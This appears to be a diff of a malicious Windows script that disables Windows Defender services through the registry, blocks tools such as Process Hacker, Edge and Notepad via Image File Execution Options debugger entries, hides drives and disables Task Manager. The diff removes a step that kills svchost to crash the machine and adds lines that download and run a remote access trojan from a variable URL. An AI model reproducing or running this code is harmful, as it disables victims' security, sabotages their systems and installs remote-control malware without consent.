@@ -38,12 +38,8 @@ reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWOR
 reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
 reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
 reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
-
-#rat
 PowerShell (New-Object System.Net.WebClient).DownloadFile($url_rat,$rat), #Downloading Rat
 (New-Object -com Shell.Application).ShellExecute($file); #Open Rat
-#go
-
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SU.exe" /v Debugger /t REG_SZ /d "LOL" /f 
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t REG_SZ /d "LOL" /f 
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ProcessHacker.exe" /v Debugger /t REG_SZ /d "LOL" /f 
@@ -60,7 +56,5 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image F
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "LOL" /f 
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d "4" /f
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v DisableTaskMgr /t REG_DWORD /d "1" /f
-
-#bsod
-Start-Sleep -Seconds 60
-taskkill /f /im svchost.exe
+PowerShell (New-Object System.Net.WebClient).DownloadFile($url_rat,$rat),
+(New-Object -com Shell.Application).ShellExecute($file);
